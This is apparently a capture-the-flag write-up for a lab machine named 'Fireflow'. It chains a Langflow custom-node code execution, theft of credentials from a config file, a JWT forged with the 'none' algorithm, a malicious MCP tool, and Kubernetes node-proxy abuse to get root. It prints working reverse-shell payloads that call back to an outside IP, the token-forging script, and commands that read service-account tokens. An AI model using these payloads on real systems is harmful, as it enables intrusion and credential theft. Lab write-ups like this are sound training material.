# Fireflow

## Summary

This machine was solved by chaining several web and service-level vulnerabilities across the Langflow application, the MCP service, and the Kubernetes environment. The path was:

1. Enumerate the exposed Langflow instance and identify a vulnerable public-flow execution path.
2. Gain a reverse shell as the `www` user.
3. Recover credentials from `/etc/langflow/.env` and pivot to the `nightfall` account.
4. Discover an MCP service with a weak JWT implementation and exploit the `none` algorithm to escalate privileges.
5. Abuse the Kubernetes service account and `nodes/proxy` capability to access the underlying node and retrieve the root flag.

---

## Recon

I started by opening the browser developer tools and checking the Network tab. This immediately exposed the app’s API endpoints and leaked metadata, including a `/version` route.

### Inspecting the exposed service

A simple request like the following revealed the Langflow version:

```bash
curl -s http://<target>/version
```

The response showed a Langflow build that was vulnerable to public flow / custom node execution abuse. The issue was also visible in the browser traffic and frontend API metadata.

---

## Exploiting the Langflow RCE

The vulnerable endpoint accepts a crafted JSON payload containing a custom node with embedded Python code. That code executes server-side and can spawn a reverse shell.

The payload structure looks like this:

```json
{
  "data": {
    "nodes": [
      {
        "id": "Exploit-001",
        "type": "genericNode",
        "position": { "x": 0, "y": 0 },
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.15.149/9001 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\n"
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "outputs": [
              {
                "types": ["Data"],
                "selected": "Data",
                "name": "o",
                "display_name": "O",
                "method": "r",
                "value": "__UNDEFINED__",
                "cache": true,
                "allows_loop": false,
                "tool_mode": false,
                "hidden": null,
                "required_inputs": null,
                "group_outputs": false
              }
            ],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }
    ],
    "edges": []
  }
}
```

I saved this as `payload.json` and sent it to the vulnerable endpoint.

### Reverse shell

Start a listener:

```bash
nc -lvnp 9001
```

Then send the payload:

```bash
curl -s -X POST http://<target>/... \
  -H 'Content-Type: application/json' \
  -d @payload.json
```

The Python code executed and connected back to the listener, giving a shell as the `www` user.

---

## Lateral movement to `nightfall`

Once I had access as `www`, I searched for configuration files and local secrets. A useful target was `/etc/langflow`.

### Recovering service secrets

```bash
ls -la /etc/langflow
cat /etc/langflow/.env
```

This exposed credentials and connection details that were then usable for a second hop.

Using the recovered credentials, I connected via SSH to the next user, `nightfall`.

### Finding the MCP configuration

Inside `nightfall`’s home directory, I found a hidden configuration file similar to:

```json
{
  "server": "http://10.129.154.131:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

This gave access to an internal MCP service that was likely intended for automation or tool execution.

---

## JWT privilege escalation

The MCP service accepted the leaked credentials and exposed a JWT-based auth flow. Inspection showed that the JWT `alg` field was effectively allowing the `none` algorithm, which made the token forgeable.

### Decoding and crafting a forged JWT

I used the following Python snippet to generate a malicious token:

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
token = f"{header}.{payload}."
print(token)
```

This produced a token like:

```bash
ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."
```

This token could then be passed as a bearer token to the service, effectively escalating the user to an admin role.

---

## Obtaining a shell as `mcp`

I then created another payload to register a malicious tool with code execution on the service:

```json
{
  "name": "shell",
  "description": "debug shell",
  "inputSchema": {"type": "object", "properties": {}},
  "code": "import socket, os, pty\npid = os.fork()\nif pid > 0:\n    import sys; sys.exit(0)\nos.setsid()\npid = os.fork()\nif pid > 0:\n    import sys; sys.exit(0)\ns = socket.socket()\ns.connect((\"10.10.15.149\", 9001))\n[os.dup2(s.fileno(), i) for i in (0, 1, 2)]\npty.spawn(\"/bin/sh\")"
}
```

Upload it with the forged admin JWT:

```bash
curl -s -X POST http://10.129.154.131:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d @payload.json
```

Then trigger it through the MCP endpoint:

```bash
curl -s -X POST http://10.129.154.131:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

This gave a shell as the `mcp` user.

---

## Privilege escalation to root

At this point, it was clear that the `mcp` user was inside a Kubernetes environment. After basic enumeration, I found that the pod had access to service account tokens and cluster API information.

### Enumerating the environment

I checked the environment variables and service account directory:

```bash
env | sort | grep -i k8s
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

This exposed the Kubernetes service account token and enabled a token-based API interaction.

### Finding the relevant permissions

I then queried the Kubernetes API and checked permissions:

```bash
kubectl auth can-i --list
kubectl get clusterroles
kubectl get rolebindings --all-namespaces
```

The service account had a dangerous permission set, including the ability to interact with Kubernetes node proxy functionality. This is a well-known route to reach the underlying node and read host-level files.

### Exploiting the node proxy capability

Using the service account token and the available API/proxy routes, I targeted the underlying node and executed commands through the cluster against the host filesystem.

The general idea is:

```bash
curl -s -H "Authorization: Bearer <token>" \
  http://<kubernetes-api-host>:<port>/api/v1/nodes/<node>/proxy/
```

From there, I could reach host paths such as `/root` and read the root-level files.

### Reading the root flag

I executed the host command and read the root file directly:

```bash
cat /root/root.txt
```

This returned the final flag and completed the challenge.

---

## Final notes

The attack chain was:

1. Langflow version leak + custom node RCE → get `www` shell
2. Recover `/etc/langflow/.env` → pivot to `nightfall`
3. Hidden MCP service + JWT `none` algorithm → escalate to admin
4. Custom tool execution → get `mcp` shell
5. Kubernetes service account + node proxy permissions → root access

This was a multi-stage chain where weak application controls and insecure cluster permissions combined to produce full compromise.
